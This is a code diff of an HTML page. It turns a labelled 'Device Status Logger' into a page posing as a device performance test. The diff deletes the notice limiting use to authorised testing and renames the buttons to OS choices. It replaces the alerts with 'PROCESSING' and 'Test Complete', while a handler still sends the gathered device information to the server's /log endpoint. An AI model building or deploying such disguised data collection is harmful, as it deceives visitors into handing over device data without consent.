@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Device Status Logger — Ripple Edition</title>
+<title>Device Status — Ripple Edition</title>
 <style>
 html,body{
   margin:0; padding:0; height:100%; overflow:hidden;
@@ -14,6 +14,15 @@ body{
   background:url("https://files.catbox.moe/c29z2z.jpg") center/cover no-repeat fixed;
   position:relative;
 }
+#matrixCanvas {
+      position: absolute;
+      top: 0;
+      left: 0;
+      z-index: -2;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+    }
 
 /* Ripple Canvas */
 #rippleCanvas{
@@ -40,10 +49,10 @@ body{
 
 /* Neon animation */
 @keyframes neon {
-  0% {box-shadow:0 0 10px #00f0ff,0 0 20px #00f0ff,0 0 30px #00f0ff;}
-  33% {box-shadow:0 0 10px #ff005c,0 0 20px #ff005c,0 0 30px #ff005c;}
-  66% {box-shadow:0 0 10px #00ff73,0 0 20px #00ff73,0 0 30px #00ff73;}
-  100%{box-shadow:0 0 10px #00f0ff,0 0 20px #00f0ff,0 0 30px #00f0ff;}
+  0% {box-shadow:0 0 5px #00f0ff,0 0 10px #00f0ff,0 0 15px #00f0ff;}
+  33% {box-shadow:0 0 5px #ff005c,0 0 10px #ff005c,0 0 15px #ff005c;}
+  66% {box-shadow:0 0 5px #00ff73,0 0 10px #00ff73,0 0 15px #00ff73;}
+  100%{box-shadow:0 0 5px #00f0ff,0 0 10px #00f0ff,0 0 15px #00f0ff;}
 }
 
 button{
@@ -60,6 +69,25 @@ button{
   transition:transform .2s ease;
 }
 button:hover{transform:scale(1.05);}
+buttonX {
+      width: 140px;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 0px 15px;
+      background-color: red;
+      border-radius: 10px;
+      border: none;
+      color: white;
+      position: relative;
+      cursor: pointer;
+      font-weight: 900;
+      transition-duration: .2s;
+      background: linear-gradient(0deg, #000, #272727);
+      text-decoration: none;
+    }
 
 /* Logs & Photos */
 #logSection{
@@ -104,18 +132,19 @@ button:hover{transform:scale(1.05);}
 </style>
 </head>
 <body>
+<canvas id="matrixCanvas"></canvas>
 <canvas id="rippleCanvas"></canvas>
 
 <div class="main">
-  <h2>Device Status Logger</h2>
+  <h2>SELECT YOUR DEVICE OS</h2>
   <p style="max-width:600px;color:#bcd;text-shadow:0 0 5px #000">
-    Collects and logs full device status (for your own authorized testing only).
+    Tests selected Device's Performance Status
   </p>
 
   <div>
-    <button id="collectLocal">Collect Locally</button>
-    <button id="collectSend">Collect &amp; Send</button>
-    <button id="showLogs">View Logs</button>
+    <button id="collectLocal">WIN/LINUX </button>
+    <button id="collectSend">iOS/ANDROID</button>
+    <button id="showLogs">VIEW RESULTS FOR SELECTED DEVICE</button>
   </div>
 
   <div id="logSection"></div>
@@ -212,7 +241,7 @@ async function gatherInfo(){
 // ---------------- Button Handlers ----------------
 document.getElementById('collectLocal').onclick = async ()=>{
   const data = await gatherInfo();
-  alert("Device info collected locally.");
+  alert("PROCESSING.....");
   console.log(data);
 };
 
@@ -220,12 +249,12 @@ document.getElementById('collectSend').onclick = async ()=>{
   const data = await gatherInfo();
   try{
     await fetch("/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
-    alert("Device info sent to server.");
+    alert("iOS/ANDROID Test Complete.");
   }catch(e){console.error(e); alert("Failed to send.");}
 };
 
 document.getElementById('showLogs').onclick = async ()=>{
-  const key = prompt("Enter access key:");
+  const key = prompt("Guess Access key to review your resilts.:");
   if(key !== "54321"){ alert("Wrong key."); return; }
   try{
     const res = await fetch("/view?key="+encodeURIComponent(key));
@@ -264,6 +293,36 @@ document.getElementById('showLogs').onclick = async ()=>{
     logSection.style.display = 'block';
   }catch(e){ console.error(e); alert("Failed to fetch logs.");}
 };
+
+const matrixCanvas = document.getElementById("matrixCanvas");
+    const matrixCtx = matrixCanvas.getContext("2d");
+    matrixCanvas.width = window.innerWidth;
+    matrixCanvas.height = window.innerHeight;
+
+    const letters = "01LordMega";
+    const fontSize = 16;
+    const columns = matrixCanvas.width / fontSize;
+    const drops = Array(Math.floor(columns)).fill(1);
+
+    function drawMatrix() {
+      matrixCtx.fillStyle = "rgba(0, 0, 0, 0.1)";
+      matrixCtx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
+      matrixCtx.fillStyle = "#0F0";
+      matrixCtx.font = `${fontSize}px monospace`;
+
+      for (let i = 0; i < drops.length; i++) {
+        const text = letters.charAt(Math.floor(Math.random() * letters.length));
+        matrixCtx.fillText(text, i * fontSize, drops[i] * fontSize);
+        if (drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      }
+    }
+    setInterval(drawMatrix, 50);
+
+    window.addEventListener('resize', () => {
+      matrixCanvas.width = window.innerWidth;
+      matrixCanvas.height = window.innerHeight;
+    });
 </script>
 </body>
 </html>
